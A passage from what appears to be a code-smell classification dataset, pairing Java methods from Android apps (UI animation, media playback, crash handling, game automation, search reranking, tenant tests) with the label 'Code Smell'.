      filterTabsView.getListView().setPivotX(isDrawerTransition ? filterTabsView.getMeasuredWidth() : 0);
      filterTabsView.getListView().setPivotY(0);
      filterTabsView.invalidate();
    }
    if (dialogStoriesCell != null) {
      dialogStoriesCell.setScaleX(s);
      dialogStoriesCell.setScaleY(s);
      dialogStoriesCell.setTranslationX((isDrawerTransition ? dp(4) : -dp(4)) * (1f - slideFragmentProgress));
      dialogStoriesCell.setPivotX(isDrawerTransition ? dialogStoriesCell.getMeasuredWidth() : 0);
      dialogStoriesCell.setPivotY(0);
    }
    if (rightSlidingDialogContainer != null && rightSlidingDialogContainer.getFragmentView() != null) {
      if (!rightFragmentTransitionInProgress) {
        rightSlidingDialogContainer.getFragmentView().setScaleX(s);
        rightSlidingDialogContainer.getFragmentView().setScaleY(s);
        rightSlidingDialogContainer.getFragmentView().setTranslationX((isDrawerTransition ? dp(4) : -dp(4)) * (1f - slideFragmentProgress));
      }
      rightSlidingDialogContainer.getFragmentView().setPivotX(isDrawerTransition ? rightSlidingDialogContainer.getMeasuredWidth() : 0);
      rightSlidingDialogContainer.getFragmentView().setPivotY(0);
    }
  }
}",1,Code Smell
"@Override protected void onEmojiSelected(View emojiView,Long documentId,TLRPC.Document document,Integer until){
  TLRPC.TL_account_updateEmojiStatus req=new TLRPC.TL_account_updateEmojiStatus();
  if (documentId == null) {
    req.emoji_status=new TLRPC.TL_emojiStatusEmpty();
  }
 else   if (until != null) {
    req.emoji_status=new TLRPC.TL_emojiStatusUntil();
    ((TLRPC.TL_emojiStatusUntil)req.emoji_status).document_id=documentId;
    ((TLRPC.TL_emojiStatusUntil)req.emoji_status).until=until;
  }
 else {
    req.emoji_status=new TLRPC.TL_emojiStatus();
    ((TLRPC.TL_emojiStatus)req.emoji_status).document_id=documentId;
  }
  TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(UserConfig.getInstance(currentAccount).getClientUserId());
  if (user != null) {
    user.emoji_status=req.emoji_status;
    MessagesController.getInstance(currentAccount).updateEmojiStatusUntilUpdate(user.id,user.emoji_status);
    NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.userEmojiStatusUpdated,user);
  }
  for (int a=0; a < 2; ++a) {
    if (emojiStatusDrawable[a] != null) {
      if (documentId == null) {
        emojiStatusDrawable[a].set(getPremiumCrossfadeDrawable(),true);
      }
 else {
        emojiStatusDrawable[a].set(documentId,true);
      }
    }
  }
  if (documentId != null) {
    animatedStatusView.animateChange(ReactionsLayoutInBubble.VisibleReaction.fromCustomEmoji(documentId));
  }
  updateEmojiStatusDrawableColor();
  updateEmojiStatusEffectPosition();
  ConnectionsManager.getInstance(currentAccount).sendRequest(req,(res,err) -> {
    if (!(res instanceof TLRPC.TL_boolTrue)) {
    }
  }
);
  if (popup[0] != null) {
    selectAnimatedEmojiDialog=null;
    popup[0].dismiss();
  }
}",1,Code Smell
"private static void collectAnimalCard(){
  try {
    JSONObject jo=new JSONObject(AntForestRpcCall.antdodoHomePage());
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONObject data=jo.getJSONObject(""data"");
      JSONObject animalBook=data.getJSONObject(""animalBook"");
      String bookId=animalBook.getString(""bookId"");
      String endDate=animalBook.getString(""endDate"") + "" 23:59:59"";
      antdodoReceiveTaskAward();
      if (!antdodoIn8Days(endDate) || antdodoLastDay(endDate))       antdodoPropList();
      JSONArray ja=data.getJSONArray(""limit"");
      int index=-1;
      for (int i=0; i < ja.length(); i++) {
        jo=ja.getJSONObject(i);
        if (""DAILY_COLLECT"".equals(jo.getString(""actionCode""))) {
          index=i;
          break;
        }
      }
      if (index >= 0) {
        int leftFreeQuota=jo.getInt(""leftFreeQuota"");
        for (int j=0; j < leftFreeQuota; j++) {
          jo=new JSONObject(AntForestRpcCall.antdodoCollect());
          if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
            data=jo.getJSONObject(""data"");
            JSONObject animal=data.getJSONObject(""animal"");
            String ecosystem=animal.getString(""ecosystem"");
            String name=animal.getString(""name"");
            Log.forest(""绁炲鐗╃馃["" + ecosystem + ""]#""+ name);
            if (!Config.sendFriendCard().isEmpty() && !FriendIdMap.getCurrentUid().equals(Config.sendFriendCard().get(0))) {
              int fantasticStarQuantity=animal.optInt(""fantasticStarQuantity"",0);
              if (fantasticStarQuantity == 3) {
                sendCard(animal,Config.sendFriendCard().get(0));
              }
            }
          }
 else {
            Log.i(TAG,jo.getString(""resultDesc""));
          }
        }
      }
      if (!Config.sendFriendCard().isEmpty() && !FriendIdMap.getCurrentUid().equals(Config.sendFriendCard().get(0))) {
        sendAntdodoCard(bookId,Config.sendFriendCard().get(0));
      }
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""collect err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"public static int getDetectedVersion(){
  EGL10 egl=(EGL10)EGLContext.getEGL();
  EGLDisplay display=egl.eglGetDisplay(EGL10.EGL_DEFAULT_DISPLAY);
  int[] numConfigs=new int[1];
  if (egl.eglInitialize(display,null)) {
    try {
      boolean checkES3=hasExtension(egl.eglQueryString(display,EGL10.EGL_EXTENSIONS),""EGL_KHR_create_context"");
      if (egl.eglGetConfigs(display,null,0,numConfigs)) {
        EGLConfig[] configs=new EGLConfig[numConfigs[0]];
        if (egl.eglGetConfigs(display,configs,numConfigs[0],numConfigs)) {
          int highestEsVersion=0;
          int[] value=new int[1];
          for (int i=0; i < numConfigs[0]; i++) {
            if (egl.eglGetConfigAttrib(display,configs[i],EGL10.EGL_RENDERABLE_TYPE,value)) {
              if (checkES3 && ((value[0] & EGL_OPENGL_ES3_BIT_KHR) == EGL_OPENGL_ES3_BIT_KHR)) {
                if (highestEsVersion < 3)                 highestEsVersion=3;
              }
 else               if ((value[0] & EGL_OPENGL_ES2_BIT) == EGL_OPENGL_ES2_BIT) {
                if (highestEsVersion < 2)                 highestEsVersion=2;
              }
 else               if ((value[0] & EGL_OPENGL_ES_BIT) == EGL_OPENGL_ES_BIT) {
                if (highestEsVersion < 1)                 highestEsVersion=1;
              }
            }
 else {
              Log.w(""glesDetect"",""Getting config attribute with "" + ""EGL10#eglGetConfigAttrib failed "" + ""("" + i + ""/""+ numConfigs[0]+ ""): ""+ egl.eglGetError());
            }
          }
          return highestEsVersion;
        }
 else {
          Log.e(""glesDetect"",""Getting configs with EGL10#eglGetConfigs failed: "" + egl.eglGetError());
          return -1;
        }
      }
 else {
        Log.e(""glesDetect"",""Getting number of configs with EGL10#eglGetConfigs failed: "" + egl.eglGetError());
        return -2;
      }
    }
  finally {
      egl.eglTerminate(display);
    }
  }
 else {
    Log.e(""glesDetect"",""Couldn't initialize EGL."");
    return -3;
  }
}",1,Code Smell
"@Override protected void onCreateSecondaryActions(ArrayObjectAdapter adapter){
  super.onCreateSecondaryActions(adapter);
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_HIGH_QUALITY)) {
    adapter.add(mHighQualityAction);
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_OPEN_CHANNEL)) {
    adapter.add(mChannelAction);
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_LIKE)) {
    adapter.add(mThumbsUpAction);
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_DISLIKE)) {
    adapter.add(mThumbsDownAction);
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_SUBTITLES)) {
    adapter.add(mClosedCaptioningAction);
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_ADD_TO_PLAYLIST)) {
    adapter.add(mPlaylistAddAction);
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_SUBSCRIBE)) {
    adapter.add(mActions.get(R.id.action_subscribe));
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_VIDEO_INFO)) {
    adapter.add(mVideoInfoAction);
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_PLAYBACK_QUEUE)) {
    adapter.add(mPlaybackQueueAction);
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_CONTENT_BLOCK)) {
    adapter.add(mActions.get(R.id.action_content_block));
  }
  if (mPlayerTweaksData.isPlayerButtonEnabled(PlayerTweaksData.PLAYER_BUTTON_VIDEO_STATS)) {
    adapter.add(mVideoStatsAction);
  }
}
",1,Code Smell
"void createHeadersTransition(){
  mHeadersTransition=TransitionHelper.loadTransition(getContext(),mShowingHeaders ? R.transition.lb_browse_headers_in : R.transition.lb_browse_headers_out);
  TransitionHelper.addTransitionListener(mHeadersTransition,new TransitionListener(){
    @Override public void onTransitionStart(    Object transition){
    }
    @Override public void onTransitionEnd(    Object transition){
      mHeadersTransition=null;
      if (mMainFragmentAdapter != null) {
        mMainFragmentAdapter.onTransitionEnd();
        if (!mShowingHeaders && mMainFragment != null) {
          View mainFragmentView=mMainFragment.getView();
          if (mainFragmentView != null && !mainFragmentView.hasFocus()) {
            mainFragmentView.requestFocus();
          }
        }
      }
      if (mHeadersSupportFragment != null) {
        mHeadersSupportFragment.onTransitionEnd();
        if (mShowingHeaders) {
          VerticalGridView headerGridView=mHeadersSupportFragment.getVerticalGridView();
          if (headerGridView != null && !headerGridView.hasFocus()) {
            headerGridView.requestFocus();
          }
        }
      }
      updateTitleViewVisibility();
      if (mBrowseTransitionListener != null) {
        mBrowseTransitionListener.onHeadersTransitionStop(mShowingHeaders);
      }
    }
  }
);
}
",1,Code Smell
"private MediaTrack findBestMatch(MediaTrack originTrack){
  Log.d(TAG,""findBestMatch: Starting: "" + originTrack.format);
  Renderer renderer=mRenderers[originTrack.rendererIndex];
  MediaTrack result=createAutoSelection(originTrack.rendererIndex);
  if (originTrack.format != null) {
    MediaTrack prevResult;
    MediaTrack[][] mediaTracks=filterByLanguage(renderer.mediaTracks,originTrack);
    for (int groupIndex=0; groupIndex < mediaTracks.length; groupIndex++) {
      prevResult=result;
      MediaTrack[] trackGroup=mediaTracks[groupIndex];
      if (trackGroup == null) {
        Log.e(TAG,""Track selection error. Media track group %s is empty."",groupIndex);
        continue;
      }
      for (      MediaTrack mediaTrack : trackGroup) {
        if (mediaTrack == null) {
          continue;
        }
        int bounds=originTrack.inBounds(mediaTrack);
        if (bounds >= 0) {
          int compare=mediaTrack.compare(result);
          if (compare == 0) {
            if (MediaTrack.codecEquals(mediaTrack,originTrack)) {
              result=mediaTrack;
            }
 else             if (!MediaTrack.codecEquals(result,originTrack) && !MediaTrack.preferByCodec(result,mediaTrack)) {
              result=mediaTrack;
            }
          }
 else           if (compare > 0) {
            if (!MediaTrack.preferByCodec(result,mediaTrack)) {
              result=mediaTrack;
            }
          }
        }
      }
      if (MediaTrack.codecEquals(result,originTrack)) {
        if (MediaTrack.codecEquals(prevResult,originTrack) && prevResult.compare(result) > 0) {
          result=prevResult;
        }
      }
 else       if (MediaTrack.codecEquals(prevResult,originTrack)) {
        result=prevResult;
      }
 else       if (prevResult.compare(result) == 0) {
        if (MediaTrack.preferByCodec(prevResult,result)) {
          result=prevResult;
        }
      }
    }
  }
  Log.d(TAG,""findBestMatch: Found: "" + result.format);
  return result;
}",1,Code Smell
"private static void crashHandler(Thread thread,Throwable throwable){
  if (Looper.getMainLooper().getThread() != thread) {
    logger.error(""Uncaught exception on thread "" + thread.getName(),throwable);
    return;
  }
  new Thread(){
    @Override public void run(){
      Looper.prepare();
      String badPlugin=null;
      boolean disabledPlugin=false;
      for (      StackTraceElement ele : throwable.getStackTrace()) {
        String className=ele.getClassName();
        for (        Map.Entry<PathClassLoader,Plugin> entry : PluginManager.classLoaders.entrySet()) {
          try {
            var loadedClass=entry.getKey().loadClass(className);
            if (!loadedClass.getClassLoader().equals(entry.getKey())) {
              continue;
            }
            badPlugin=entry.getValue().getName();
            if (Main.settings.getBool(AliucordPageKt.AUTO_DISABLE_ON_CRASH_KEY,true)) {
              disabledPlugin=true;
              Main.settings.setBool(PluginManager.getPluginPrefKey(badPlugin),false);
            }
            break;
          }
 catch (          ClassNotFoundException ignored) {
          }
        }
        if (badPlugin != null) {
          break;
        }
      }
      File folder=new File(Constants.CRASHLOGS_PATH);
      if (folder.exists() || folder.mkdir()) {
        File file=new File(folder,new Timestamp(System.currentTimeMillis()).toString().replaceAll("":"",""_"") + "".txt"");
        try (PrintStream ps=new PrintStream(file)){
          throwable.printStackTrace(ps);
        }
 catch (        FileNotFoundException ignored) {
        }
      }
      var sb=new StringBuilder(""An unrecoverable crash occurred. "");
      if (badPlugin != null) {
        sb.append(""This crash was caused by "").append(badPlugin);
        if (disabledPlugin) {
          sb.append("", so I automatically disabled it for you"");
        }
        sb.append("". "");
      }
      sb.append(""Check the crashes section in the settings for more info."");
      Toast.makeText(Utils.getAppContext(),sb.toString(),Toast.LENGTH_LONG).show();
      Looper.loop();
    }
  }
.start();
  try {
    Thread.sleep(4200);
  }
 catch (  InterruptedException ignored) {
  }
  System.exit(2);
}",1,Code Smell
"public ThanosEffect(@NonNull Context context,Runnable whenDoneCallback){
  super(context);
  this.whenDone=whenDoneCallback;
  setOpaque(false);
  setSurfaceTextureListener(new TextureView.SurfaceTextureListener(){
    @Override public void onSurfaceTextureAvailable(    @NonNull SurfaceTexture surface,    int width,    int height){
      if (drawThread != null) {
        drawThread.kill();
        drawThread=null;
      }
      drawThread=new DrawingThread(surface,ThanosEffect.this::invalidate,ThanosEffect.this::destroy,width,height);
      drawThread.isEmulator=EmuDetector.with(getContext()).detect();
      if (!toSet.isEmpty()) {
        for (int i=0; i < toSet.size(); ++i) {
          ToSet toSetObj=toSet.get(i);
          if (toSetObj.bitmap != null) {
            drawThread.animate(toSetObj.matrix,toSetObj.bitmap,toSetObj.startCallback,toSetObj.doneCallback);
          }
 else           if (toSetObj.views != null) {
            drawThread.animateGroup(toSetObj.views,toSetObj.doneCallback);
          }
 else {
            drawThread.animate(toSetObj.view,toSetObj.durationMultiplier,toSetObj.doneCallback);
          }
        }
        toSet.clear();
        Choreographer.getInstance().postFrameCallback(frameCallback);
      }
    }
    @Override public void onSurfaceTextureSizeChanged(    @NonNull SurfaceTexture surface,    int width,    int height){
      if (drawThread != null) {
        drawThread.resize(width,height);
      }
    }
    @Override public boolean onSurfaceTextureDestroyed(    @NonNull SurfaceTexture surface){
      if (drawThread != null) {
        drawThread.kill();
        drawThread=null;
      }
      if (whenDone != null) {
        Runnable runnable=whenDone;
        whenDone=null;
        runnable.run();
      }
      return false;
    }
    @Override public void onSurfaceTextureUpdated(    @NonNull SurfaceTexture surface){
    }
  }
);
}",1,Code Smell
"/** 
 * Creates a cache span from an underlying cache file. Upgrades the file if necessary.
 * @param file The cache file.
 * @param length The length of the cache file in bytes, or {@link C#LENGTH_UNSET} to query theunderlying file system. Querying the underlying file system can be expensive, so callers that already know the length of the file should pass it explicitly.
 * @return The span, or null if the file name is not correctly formatted, or if the id is notpresent in the content index, or if the length is 0.
 */
@Nullable public static SimpleCacheSpan createCacheEntry(File file,long length,CachedContentIndex index){
  return createCacheEntry(file,length,C.TIME_UNSET,index);
}
/** 
 * Creates a cache span from an underlying cache file. Upgrades the file if necessary.
 * @param file The cache file.
 * @param length The length of the cache file in bytes, or {@link C#LENGTH_UNSET} to query theunderlying file system. Querying the underlying file system can be expensive, so callers that already know the length of the file should pass it explicitly.
 * @param lastTouchTimestamp The last touch timestamp, or {@link C#TIME_UNSET} to use the filetimestamp.
 * @return The span, or null if the file name is not correctly formatted, or if the id is notpresent in the content index, or if the length is 0.
 */
@Nullable public static SimpleCacheSpan createCacheEntry(File file,long length,long lastTouchTimestamp,CachedContentIndex index){
  String name=file.getName();
  if (!name.endsWith(SUFFIX)) {
    file=upgradeFile(file,index);
    if (file == null) {
      return null;
    }
    name=file.getName();
  }
  Matcher matcher=CACHE_FILE_PATTERN_V3.matcher(name);
  if (!matcher.matches()) {
    return null;
  }
  int id=Integer.parseInt(matcher.group(1));
  String key=index.getKeyForId(id);
  if (key == null) {
    return null;
  }
  if (length == C.LENGTH_UNSET) {
    length=file.length();
  }
  if (length == 0) {
    return null;
  }
  long position=Long.parseLong(matcher.group(2));
  if (lastTouchTimestamp == C.TIME_UNSET) {
    lastTouchTimestamp=Long.parseLong(matcher.group(3));
  }
  return new SimpleCacheSpan(key,position,length,lastTouchTimestamp,file);
}",1,Code Smell
"private void updateFromStoriesList(){
  loading=storiesList.isLoading();
  Calendar calendar=Calendar.getInstance();
  messagesByYearMounth.clear();
  minDate=Integer.MAX_VALUE;
  for (int i=0; i < storiesList.messageObjects.size(); ++i) {
    MessageObject messageObject=storiesList.messageObjects.get(i);
    minDate=Math.min(minDate,messageObject.messageOwner.date);
    calendar.setTimeInMillis(messageObject.messageOwner.date * 1000L);
    int month=calendar.get(Calendar.YEAR) * 100 + calendar.get(Calendar.MONTH);
    SparseArray<PeriodDay> messagesByDays=messagesByYearMounth.get(month);
    if (messagesByDays == null) {
      messagesByDays=new SparseArray<>();
      messagesByYearMounth.put(month,messagesByDays);
    }
    int index=calendar.get(Calendar.DAY_OF_MONTH) - 1;
    PeriodDay periodDay=messagesByDays.get(index);
    if (periodDay == null) {
      periodDay=new PeriodDay();
      periodDay.storyItems=new ArrayList<>();
    }
    periodDay.storyItems.add(messageObject.getId());
    periodDay.messageObject=messageObject;
    periodDay.date=(int)(calendar.getTimeInMillis() / 1000L);
    messagesByDays.put(index,periodDay);
    if (month < minMontYear || minMontYear == 0) {
      minMontYear=month;
    }
  }
  int maxDate=(int)(System.currentTimeMillis() / 1000L);
  for (int date=minDate; date < maxDate; date+=86400) {
    calendar.setTimeInMillis(date * 1000L);
    calendar.set(Calendar.HOUR_OF_DAY,0);
    calendar.set(Calendar.MINUTE,0);
    calendar.set(Calendar.SECOND,0);
    calendar.set(Calendar.MILLISECOND,0);
    int month=calendar.get(Calendar.YEAR) * 100 + calendar.get(Calendar.MONTH);
    SparseArray<PeriodDay> messagesByDays=messagesByYearMounth.get(month);
    if (messagesByDays == null) {
      messagesByDays=new SparseArray<>();
      messagesByYearMounth.put(month,messagesByDays);
    }
    int index=calendar.get(Calendar.DAY_OF_MONTH) - 1;
    if (messagesByDays.get(index,null) == null) {
      PeriodDay periodDay=new PeriodDay();
      periodDay.hasImage=false;
      periodDay.date=(int)(calendar.getTimeInMillis() / 1000L);
      messagesByDays.put(index,periodDay);
    }
  }
  endReached=storiesList.isFull();
  if (isOpened) {
    checkEnterItems=true;
  }
  listView.invalidate();
  int newMonthCount=(int)(((calendar.getTimeInMillis() / 1000) - minDate) / 2629800) + 1;
  adapter.notifyItemRangeChanged(0,monthCount);
  if (newMonthCount > monthCount) {
    adapter.notifyItemRangeInserted(monthCount + 1,newMonthCount);
    monthCount=newMonthCount;
  }
  if (endReached) {
    resumeDelayedFragmentAnimation();
  }
}",1,Code Smell
"/** 
 * Rerank results and return the worst approximate score that made it into the topK. The topK results will be placed into `reranked`, and the remainder into `unused`. <p> Only the best result or results whose approximate score is at least `rerankFloor` will be reranked.
 */
public float rerank(int topK,ScoreFunction.Reranker reranker,float rerankFloor,NodeQueue reranked,NodesUnsorted unused){
  int[] ids=new int[size()];
  float[] exactScores=new float[size()];
  var approximateScoresById=new Int2ObjectHashMap<Float>();
  float bestScore=Float.NEGATIVE_INFINITY;
  int bestIndex=-1;
  int scoresAboveFloor=0;
  for (int i=0; i < size(); i++) {
    long heapValue=heap.get(i + 1);
    float score=decodeScore(heapValue);
    var nodeId=decodeNodeId(heapValue);
    if (score > bestScore) {
      bestScore=score;
      bestIndex=i;
    }
    if (score >= rerankFloor) {
      ids[i]=nodeId;
      exactScores[i]=reranker.similarityTo(ids[i]);
      approximateScoresById.put(ids[i],Float.valueOf(score));
      scoresAboveFloor++;
    }
 else {
      ids[i]=-1;
    }
  }
  if (scoresAboveFloor == 0 && bestIndex >= 0) {
    ids[bestIndex]=decodeNodeId(heap.get(bestIndex + 1));
    exactScores[bestIndex]=reranker.similarityTo(ids[bestIndex]);
    approximateScoresById.put(ids[bestIndex],Float.valueOf(bestScore));
  }
  for (int i=0; i < ids.length; i++) {
    if (ids[i] == -1) {
      unused.add(decodeNodeId(heap.get(i + 1)),decodeScore(heap.get(i + 1)));
      continue;
    }
    if (reranked.size() < topK) {
      reranked.push(ids[i],exactScores[i]);
    }
 else     if (exactScores[i] > reranked.topScore()) {
      int evictedNode=reranked.topNode();
      unused.add(evictedNode,approximateScoresById.get(evictedNode));
      reranked.push(ids[i],exactScores[i]);
    }
 else {
      unused.add(ids[i],decodeScore(heap.get(i + 1)));
    }
  }
  float worstApproximateInTopK=Float.POSITIVE_INFINITY;
  if (reranked.size() < topK) {
    return worstApproximateInTopK;
  }
  for (int i=0; i < reranked.size(); i++) {
    int nodeId=decodeNodeId(reranked.heap.get(i + 1));
    worstApproximateInTopK=min(worstApproximateInTopK,approximateScoresById.get(nodeId));
  }
  return worstApproximateInTopK;
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.messagePlayingPlayStateChanged) {
    MessageObject messageObject=MediaController.getInstance().getPlayingMessageObject();
    if (messageObject != null) {
      createNotification(messageObject,false);
    }
 else {
      stopSelf();
    }
  }
 else   if (id == NotificationCenter.messagePlayingDidSeek) {
    MessageObject messageObject=MediaController.getInstance().getPlayingMessageObject();
    if (remoteControlClient != null && Build.VERSION.SDK_INT >= 18) {
      long progress=Math.round(messageObject.audioPlayerDuration * (float)args[1]) * 1000L;
      remoteControlClient.setPlaybackState(MediaController.getInstance().isMessagePaused() ? RemoteControlClient.PLAYSTATE_PAUSED : RemoteControlClient.PLAYSTATE_PLAYING,progress,MediaController.getInstance().isMessagePaused() ? 0f : 1f);
    }
  }
 else   if (id == NotificationCenter.httpFileDidLoad) {
    final String path=(String)args[0];
    MessageObject messageObject=MediaController.getInstance().getPlayingMessageObject();
    if (messageObject != null && loadingFilePath != null && loadingFilePath.equals(path)) {
      createNotification(messageObject,false);
    }
  }
 else   if (id == NotificationCenter.fileLoaded) {
    final String path=(String)args[0];
    MessageObject messageObject=MediaController.getInstance().getPlayingMessageObject();
    if (messageObject != null && loadingFilePath != null && loadingFilePath.equals(path)) {
      createNotification(messageObject,false);
    }
  }
 else   if (id == NotificationCenter.accountLogin) {
    final Integer a=(Integer)args[0];
    NotificationCenter.getInstance(a).addObserver(this,NotificationCenter.messagePlayingDidSeek);
    NotificationCenter.getInstance(a).addObserver(this,NotificationCenter.messagePlayingPlayStateChanged);
    NotificationCenter.getInstance(a).addObserver(this,NotificationCenter.httpFileDidLoad);
  }
}",1,Code Smell
"private synchronized void stepClientSync(String command,Socket socket,DataInputStream din) throws IOException {
  profiler.startSection(""rootClient"");
  profiler.startSection(""commandProcessing"");
  String actions=command.substring(stepClientTagLength,command.length() - (stepClientTagLength + 2));
  nsteps+=1;
  int options=Character.getNumericValue(command.charAt(stepServerTagLength - 2));
  boolean withInfo=options == 0 || options == 2;
  DataOutputStream dout=new DataOutputStream(socket.getOutputStream());
  double reward=0.0;
  boolean done;
  byte[] obs;
  String info="""";
  boolean sent=true;
  lock.lock();
  try {
    done=envState.done;
    if (actions.contains(""\n"")) {
      String[] cmds=actions.split(""\\n"");
      for (      String cmd : cmds) {
        envState.commands.add(cmd);
      }
    }
 else {
      if (!actions.isEmpty())       envState.commands.add(actions);
    }
    sent=true;
    profiler.endSection();
    profiler.startSection(""clientTick"");
    if (!done)     TimeHelper.SyncManager.clientTick.requestAndWait();
    if (shouldUsePreviousEnvState && previousEnvState != null) {
      envState=previousEnvState;
      envState.done=true;
    }
    shouldUsePreviousEnvState=false;
    profiler.endSection();
    profiler.startSection(""getObservation"");
    obs=getObservation(done);
    profiler.endSection();
    profiler.startSection(""getInfo"");
    reward=envState.reward;
    if (withInfo) {
      info=envState.info;
      if (info == ""{}"") {
        info=previousEnvState.info;
        envState.info=previousEnvState.info;
      }
    }
    done=envState.done;
    if (done) {
      TimeHelper.SyncManager.setSynchronous(false);
    }
    previousEnvState=new EnvState();
    previousEnvState.reward=envState.reward;
    previousEnvState.commands=envState.commands;
    previousEnvState.obs=envState.obs;
    previousEnvState.info=envState.info;
    previousEnvState.missionInit=envState.missionInit;
    previousEnvState.done=envState.done;
    previousEnvState.running=envState.running;
    previousEnvState.quit=envState.quit;
    previousEnvState.token=envState.token;
    previousEnvState.experimentId=envState.experimentId;
    previousEnvState.agentCount=envState.agentCount;
    previousEnvState.reset=envState.reset;
    previousEnvState.synchronous=envState.synchronous;
    previousEnvState.seed=envState.seed;
    envState.info=""{}"";
    envState.obs=null;
    envState.reward=0.0;
    profiler.endSection();
  }
  finally {
    lock.unlock();
  }
  profiler.startSection(""writeObs"");
  dout.writeInt(obs.length);
  dout.write(obs);
  dout.writeInt(BYTES_DOUBLE + 2);
  dout.writeDouble(reward);
  dout.writeByte(done ? 1 : 0);
  dout.writeByte(sent ? 1 : 0);
  if (withInfo) {
    byte[] infoBytes=info.getBytes(utf8);
    dout.writeInt(infoBytes.length);
    dout.write(infoBytes);
  }
  profiler.endSection();
  profiler.startSection(""flush"");
  dout.flush();
  profiler.endSection();
  profiler.endSection();
}",1,Code Smell
"private void fetchRecentLocations(ArrayList<TLRPC.Message> messages){
  IMapsProvider.ILatLngBoundsBuilder builder=null;
  if (firstFocus) {
    builder=ApplicationLoader.getMapsProvider().onCreateLatLngBoundsBuilder();
  }
  int date=getConnectionsManager().getCurrentTime();
  for (int a=0; a < messages.size(); a++) {
    TLRPC.Message message=messages.get(a);
    if (message.date + message.media.period > date) {
      if (builder != null) {
        IMapsProvider.LatLng latLng=new IMapsProvider.LatLng(message.media.geo.lat,message.media.geo._long);
        builder.include(latLng);
      }
      addUserMarker(message);
      if (proximityButton.getVisibility() != View.GONE && MessageObject.getFromChatId(message) != getUserConfig().getClientUserId()) {
        proximityButton.setVisibility(View.VISIBLE);
        proximityAnimationInProgress=true;
        proximityButton.animate().alpha(1.0f).scaleX(1.0f).scaleY(1.0f).setDuration(180).setListener(new AnimatorListenerAdapter(){
          @Override public void onAnimationEnd(          Animator animation){
            proximityAnimationInProgress=false;
            maybeShowProximityHint();
          }
        }
).start();
      }
    }
  }
  if (builder != null) {
    if (firstFocus) {
      listView.smoothScrollBy(0,AndroidUtilities.dp(66 * 1.5f));
    }
    firstFocus=false;
    adapter.setLiveLocations(markers);
    if (messageObject.isLiveLocation()) {
      try {
        IMapsProvider.ILatLngBounds bounds=builder.build();
        IMapsProvider.LatLng center=bounds.getCenter();
        IMapsProvider.LatLng northEast=move(center,100,100);
        IMapsProvider.LatLng southWest=move(center,-100,-100);
        builder.include(southWest);
        builder.include(northEast);
        bounds=builder.build();
        if (messages.size() > 1) {
          try {
            moveToBounds=ApplicationLoader.getMapsProvider().newCameraUpdateLatLngBounds(bounds,AndroidUtilities.dp(80 + 33));
            map.moveCamera(moveToBounds);
            moveToBounds=null;
          }
 catch (          Exception e) {
            FileLog.e(e);
          }
        }
      }
 catch (      Exception ignore) {
      }
    }
  }
}",1,Code Smell
"@Override public synchronized void onApplicationEvent(ContextRefreshedEvent event){
  if (!handlerTable.isEmpty()) {
    return;
  }
  if (ac != event.getApplicationContext()) {
    return;
  }
  Map<String,Object> map=ac.getBeansWithAnnotation(HandlerType.class);
  map.values().stream().filter(obj -> obj instanceof IHandler).forEach(object -> {
    Class clz=object.getClass();
    IHandler handler=(IHandler)object;
    Type type=null;
    do {
      Type[] types=clz.getGenericInterfaces();
      if (types == null || types.length == 0) {
        clz=clz.getSuperclass();
        continue;
      }
      for (      Type t : types) {
        if (!(t instanceof ParameterizedType) || (((ParameterizedType)t).getRawType()) != IHandler.class) {
          continue;
        }
        type=((ParameterizedType)t).getActualTypeArguments()[0];
      }
    }
 while (clz == null || type == null);
    HandlerType handlerType=object.getClass().getDeclaredAnnotation(HandlerType.class);
    Class typeClz=(Class)type;
    String[] eventTypes=handlerType.value();
    for (    String eventType : eventTypes) {
      if (!handlerTable.contains(typeClz,eventType)) {
        handlerTable.put(typeClz,eventType,Lists.newArrayList());
      }
      List<IHandler> handlerList=handlerTable.get(typeClz,eventType);
      if (!handlerList.contains(handler)) {
        handlerList.add(handler);
      }
    }
  }
);
}",1,Code Smell
"@Test public void testSearchWhenUsersAreSharedAcrossTenants() throws Exception {
  if (StorageLayer.getStorage(process.getProcess()).getType() != STORAGE_TYPE.SQL) {
    return;
  }
  createUsers();
{
    for (    String userId : tenantToUsers.get(t2)) {
      TestMultitenancyAPIHelper.associateUserToTenant(t3,userId,process.getProcess());
    }
  }
  for (  TenantIdentifier tenant : new TenantIdentifier[]{t1,t2,t3}) {
{
      String[] users=getUsers(tenant,new String[]{""user""},null,null);
      assertEquals(8,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,new String[]{""gmail.com""},null,null);
      assertEquals(4,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,null,new String[]{""+1234""},null);
      assertEquals(1,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,null,null,new String[]{""goog""});
      assertEquals(2,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,null,null,new String[]{""face""});
      assertEquals(2,users.length);
      for (      String user : users) {
